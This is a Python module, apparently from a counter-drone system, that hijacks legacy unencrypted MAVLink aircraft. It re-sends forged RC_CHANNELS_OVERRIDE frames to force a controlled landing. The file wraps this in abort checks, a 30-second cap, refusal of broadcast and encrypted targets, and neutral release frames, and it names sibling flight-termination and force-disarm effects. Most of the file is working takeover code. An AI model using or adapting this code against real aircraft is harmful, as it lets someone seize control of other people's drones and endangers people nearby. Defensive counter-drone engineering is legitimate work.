#!/usr/bin/env python3
"""Bounded, immediately-abortable sustained RC_CHANNELS_OVERRIDE takeover.

This is the SUSTAINED-injection primitive behind payload PL-011
(MANEUVER TAKEOVER / CONTROLLED LANDING). It re-emits a single byte-accurate
RC_CHANNELS_OVERRIDE frame (built by backend/mavlink_codec.py) at the RC
update rate to walk a legacy/unencrypted-MAVLink craft down to a controlled
landing — the comparatively humane counterpart to the one-shot
flight-termination / force-disarm effects already in this system.

=============================================================================
SAFETY MODEL (mirrors field-bridge/jam_bridge.py's bounded-burst + abort)
=============================================================================
Authorization is NOT this module's job and is NOT re-implemented here. A
takeover only ever runs because POST /api/payloads/deploy already passed the
full, hardened gate chain (require_commander + effect+target-bound arm token +
_check_tx_not_halted + authorized-target + fire-time IFF-not-friendly +
range-auth lease). This module is the transmit plumbing that the deploy path's
"packet" carries sustain metadata into — it adds NO new authorization path and
NO way to transmit while bypassing those gates.

What this module DOES guarantee, independently and locally:

  1. BOUNDED. The stream runs for the operator-set duration but is HARD-CAPPED
     at MAX_DURATION_S (30s). It is a bounded engagement window, never
     transmit-forever. The cap is enforced on wall-clock time, not trusted
     from the caller.

  2. IMMEDIATELY ABORTABLE. tx_halted (EMERGENCY ABORT) and a per-run
     stop_event are polled BEFORE EVERY SINGLE FRAME. An abort arriving
     mid-stream terminates the takeover before the next frame goes out — an
     in-progress controlled-landing is stopped, not just future requests
     refused.

     HONEST END-STATE (F-5): the two stop paths differ, and we do NOT claim
     control returns "immediately" in both:
       * ON ABORT (tx_halted / stop_event): we STOP transmitting and send
         NOTHING further — transmitting after an EMERGENCY ABORT is forbidden.
         Because no explicit release goes out, the target autopilot LATCHES the
         last commanded (descent) RC values until ITS OWN RC-override timeout
         (~3 s on ArduPilot/PX4) expires, after which it reverts to its own
         RC/failsafe. Control return is therefore delayed by that autopilot
         timeout, not instantaneous.
       * ON NORMAL (non-aborted) completion of the bounded window: we emit a
         short burst of explicit neutral RC_CHANNELS_OVERRIDE "release" frames
         (all channels = 0 => "do not override this channel"), so the craft
         reclaims its own RC promptly at the planned end rather than waiting out
         the autopilot timeout. Those release frames are themselves guarded by
         the tx_halted check — if an abort races in, they are NOT sent.

  3. HONEST. RC override has NO effect against an FHSS/encrypted control link
     (ELRS/CRSF, DJI OcuSync, DSMX, hop-paired RC). If the target link is
     encrypted/hop-paired, run_sustained_takeover REFUSES and reports
     not-applicable rather than transmitting uselessly. See
     ENCRYPTED_LINK_PROTOCOLS below and the scope note in mavlink_codec.py.
"""
from __future__ import annotations

import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, List, Optional

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "backend"))
from mavlink_codec import (  # noqa: E402
    payload_maneuver_takeover,
    # F-7: cap and encrypted-link list now imported from the ONE source of
    # truth (mavlink_codec) instead of re-declared here, so a safety cap can't
    # silently drift between the backend and this separately-deployable bridge.
    MANEUVER_TAKEOVER_MAX_DURATION_S,
    ENCRYPTED_LINK_PROTOCOLS,  # noqa: F401  (re-exported for callers/tests)
    classify_override_link,
    link_is_overridable as _codec_link_is_overridable,
    build_rc_channels_override_payload,
    build_packet_v2,
    RC_OVERRIDE_RELEASE,
)

# Hard cap — imported (F-7), identical everywhere by construction.
MAX_DURATION_S = MANEUVER_TAKEOVER_MAX_DURATION_S


def link_is_overridable(protocol: Optional[str], legacy_attested: bool = False) -> bool:
    """FAIL-CLOSED (F-3) applicability gate — thin wrapper over the shared
    mavlink_codec.link_is_overridable so the bridge and the backend apply the
    IDENTICAL rule:

      * encrypted/FHSS link          => False (RC override is a NO-OP).
      * recognized legacy MAVLink     => True.
      * UNKNOWN/empty protocol        => False (fail closed) UNLESS the operator
                                         attested legacy MAVLink
                                         (legacy_attested=True).

    Previously this returned True for an unknown/empty protocol, which for a
    control override defaulted to 'allowed' — now it fails closed."""
    return _codec_link_is_overridable(protocol, legacy_attested=legacy_attested)


@dataclass
class TakeoverResult:
    ok: bool
    frames_sent: int = 0              # controlled-descent override frames
    release_frames_sent: int = 0      # F-5: neutral release frames on normal end
    elapsed_s: float = 0.0
    stopped_early: bool = False       # aborted by tx_halted / stop_event
    not_applicable: bool = False      # refused: encrypted/FHSS link
    error: Optional[str] = None
    reason: Optional[str] = None


def run_sustained_takeover(
    send_frame: Callable[[bytes], None],
    target_system: int,
    target_component: int = 1,
    duration_s: float = 8.0,
    rc_rate_hz: float = 20.0,
    stop_event: Optional[threading.Event] = None,
    tx_halted: Optional[Callable[[], bool]] = None,
    target_protocol: Optional[str] = None,
    target_link_legacy_mavlink: bool = False,
    release_frames: int = 3,
    on_started: Optional[Callable[[], None]] = None,
    now: Callable[[], float] = time.monotonic,
    sleep: Callable[[float], None] = time.sleep,
) -> TakeoverResult:
    """Emit RC_CHANNELS_OVERRIDE controlled-landing frames at rc_rate_hz for a
    bounded, hard-capped duration, aborting immediately on tx_halted/stop_event.

    send_frame(frame_bytes) does the actual TX (e.g. serial.write). It is
    injected so this is unit-testable with a fake sink and a fake clock.
    tx_halted() is polled before every frame; stop_event.is_set() likewise.
    now()/sleep() are injectable for deterministic tests.

    F-3: target_link_legacy_mavlink is the operator's legacy-MAVLink attestation
    used to pass the fail-closed applicability gate for an UNKNOWN protocol.
    F-5: on NORMAL completion (bounded window elapsed, not aborted) a short
    burst of `release_frames` neutral (all-channels-0) RC_CHANNELS_OVERRIDE
    frames is emitted so control returns promptly; on ABORT nothing further is
    transmitted (see module docstring).
    """
    # --- Honesty gate (F-3, fail-closed): encrypted/FHSS OR unknown-without-
    #     attestation => not applicable, transmit nothing.
    if not link_is_overridable(target_protocol, legacy_attested=target_link_legacy_mavlink):
        cls = classify_override_link(target_protocol)
        if cls == "encrypted":
            reason = (f"RC override not applicable: target link '{target_protocol}' is "
                      f"encrypted/frequency-hopping — RC_CHANNELS_OVERRIDE is ignored by "
                      f"such a craft. No RF transmitted.")
        else:
            reason = (f"RC override not applicable: target link '{target_protocol}' is "
                      f"unknown/unrecognized and no legacy-MAVLink attestation was given — "
                      f"failing closed. No RF transmitted.")
        return TakeoverResult(ok=False, not_applicable=True, reason=reason)

    # --- F-6: target_system 0 (broadcast) or negative is refused. A 0 target in
    #     MAVLink addresses EVERY craft in range; a sustained override must be
    #     bound to one concrete craft, never sprayed at a swarm.
    if target_system <= 0:
        return TakeoverResult(
            ok=False, not_applicable=True,
            reason=(f"refusing sustained takeover: target_system={target_system} is a "
                    f"broadcast/invalid address — RC override must target one concrete "
                    f"craft, not all craft in range. No RF transmitted."),
        )

    if rc_rate_hz <= 0:
        return TakeoverResult(ok=False, error="rc_rate_hz must be > 0")

    # --- Bound the duration on our side; never trust the caller past the cap.
    capped = max(0.0, min(float(duration_s), MAX_DURATION_S))
    if capped <= 0.0:
        return TakeoverResult(ok=False, error="duration_s must be > 0")
    period = 1.0 / rc_rate_hz

    def _halted() -> bool:
        if stop_event is not None and stop_event.is_set():
            return True
        if tx_halted is not None and tx_halted():
            return True
        return False

    # Abort even before the first frame if an abort is already in effect.
    if _halted():
        return TakeoverResult(ok=True, stopped_early=True, frames_sent=0, elapsed_s=0.0,
                              reason="EMERGENCY ABORT in effect before takeover start")

    if on_started is not None:
        on_started()

    start = now()
    deadline = start + capped
    frames = 0
    seq = 0
    try:
        while True:
            # (1) Poll abort BEFORE every frame — an abort here stops the stream
            #     before the next override goes out.
            if _halted():
                elapsed = now() - start
                return TakeoverResult(ok=True, stopped_early=True, frames_sent=frames,
                                      elapsed_s=elapsed,
                                      reason="EMERGENCY ABORT — takeover terminated mid-stream")
            # (2) Hard duration bound — NORMAL completion.
            t = now()
            if t >= deadline:
                # F-5: emit an explicit neutral RC-override release burst so the
                # craft reclaims its own RC promptly at the planned end instead
                # of latching the last descent throttle until the autopilot's
                # own ~3 s override timeout. Guarded by _halted(): if an abort
                # raced in, send NOTHING further.
                released = 0
                if release_frames > 0 and not _halted():
                    release_payload = build_rc_channels_override_payload(
                        target_system, target_component,
                        chan1=RC_OVERRIDE_RELEASE, chan2=RC_OVERRIDE_RELEASE,
                        chan3=RC_OVERRIDE_RELEASE, chan4=RC_OVERRIDE_RELEASE,
                    )
                    for _ in range(release_frames):
                        if _halted():
                            break
                        send_frame(build_packet_v2(70, release_payload, sequence=seq & 0xFF))
                        seq += 1
                        released += 1
                return TakeoverResult(
                    ok=True, stopped_early=False, frames_sent=frames,
                    release_frames_sent=released, elapsed_s=t - start,
                    reason=(f"bounded takeover window elapsed; emitted {released} neutral "
                            f"RC-override release frame(s) so control returns promptly"))
            # (3) One controlled-landing override frame.
            frame = payload_maneuver_takeover(target_system, target_component, seq=seq & 0xFF)
            send_frame(frame)
            frames += 1
            seq += 1
            # (4) Sleep to the next RC tick, but not past the deadline; wake to
            #     re-check the abort promptly.
            remaining = deadline - now()
            if remaining <= 0:
                continue
            sleep(min(period, remaining))
    except Exception as e:  # never raise out of the transmit loop
        return TakeoverResult(ok=False, frames_sent=frames, elapsed_s=now() - start,
                              error=f"takeover TX error: {e}")
